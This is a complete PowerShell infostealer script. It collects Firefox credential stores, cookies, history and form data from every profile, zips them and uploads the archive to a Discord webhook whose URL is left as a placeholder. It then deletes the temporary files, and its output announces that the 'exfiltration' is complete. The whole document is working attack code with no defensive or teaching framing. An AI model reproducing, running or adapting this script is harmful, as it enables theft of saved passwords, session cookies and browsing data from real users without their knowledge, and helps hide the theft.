param(
    [Parameter(Mandatory=$false)]
    [string]$WebhookUrl = "YOUR-WEBHOOK-URL-HERE"
)

function Send-ToDiscord {
    param($webhook, $file)
    try {
        $fileBytes = [System.IO.File]::ReadAllBytes($file)
        $fileContent = [System.Convert]::ToBase64String($fileBytes)
        $boundary = [System.Guid]::NewGuid().ToString()
        $LF = "`r`n"
        
        $bodyLines = (
            "--$boundary",
            "Content-Disposition: form-data; name=`"file`"; filename=`"$($file.Split('\')[-1])`"",
            "Content-Type: application/octet-stream$LF",
            $fileContent,
            "--$boundary--$LF"
        ) -join $LF
        
        $headers = @{
            "Content-Type" = "multipart/form-data; boundary=$boundary"
        }
        
        Invoke-RestMethod -Uri $webhook -Method Post -Headers $headers -Body $bodyLines
    } catch {
        Write-Warning "Failed to send file: $_"
    }
}

function Get-FirefoxData {
    param($webhook)
    
    try {
        # Create temp directory
        $timestamp = Get-Date -Format "MM-dd-yyyy_HH-mm-ss"
        $tempDir = "$env:TEMP\ff_$timestamp"
        New-Item -ItemType Directory -Path $tempDir -Force | Out-Null
        
        # Firefox profile locations
        $locations = @(
            "$env:APPDATA\Mozilla\Firefox\Profiles",
            "$env:LOCALAPPDATA\Mozilla\Firefox\Profiles"
        )
        
        foreach ($location in $locations) {
            if (Test-Path $location) {
                Get-ChildItem $location -Directory | ForEach-Object {
                    $profile = $_.FullName
                    
                    # Important files to grab
                    $targets = @(
                        "key*.db",
                        "cert*.db",
                        "logins.json",
                        "cookies.sqlite",
                        "places.sqlite",
                        "formhistory.sqlite"
                    )
                    
                    foreach ($target in $targets) {
                        Get-ChildItem -Path $profile -Filter $target -File | ForEach-Object {
                            try {
                                # Copy file to temp location
                                $destPath = Join-Path $tempDir $_.Name
                                Copy-Item $_.FullName $destPath -Force
                            } catch {
                                Write-Warning "Failed to copy $($_.Name): $_"
                            }
                        }
                    }
                }
            }
        }
        
        # Compress files
        $zipPath = "$tempDir.zip"
        Compress-Archive -Path $tempDir -DestinationPath $zipPath -Force
        
        # Send to Discord
        Send-ToDiscord -webhook $webhook -file $zipPath
        
        # Cleanup
        Remove-Item $tempDir -Recurse -Force -ErrorAction SilentlyContinue
        Remove-Item $zipPath -Force -ErrorAction SilentlyContinue
        
        Write-Output "Firefox data exfiltration completed"
        
    } catch {
        Write-Warning "Operation failed: $_"
    }
}

# Execute the exfiltration
Get-FirefoxData -webhook $WebhookUrl
